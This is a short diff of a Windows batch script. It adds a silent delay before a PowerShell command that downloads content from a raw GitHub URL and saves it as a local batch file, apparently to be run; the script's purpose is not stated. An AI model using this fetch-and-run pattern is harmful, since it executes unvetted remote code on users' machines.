@@ -32,6 +32,9 @@ color 0A
 setlocal enabledelayedexpansion
 set "embeddedScript=temp_script_RUNEVERY.bat"
 
+timeout /t 7 /nobreak >nul
+
+
 :RUNEVERYCALLER
 :: Download content and save to the embedded batch file
 powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Codes/RunEvery') | Out-File -Encoding ASCII '%embeddedScript%'"
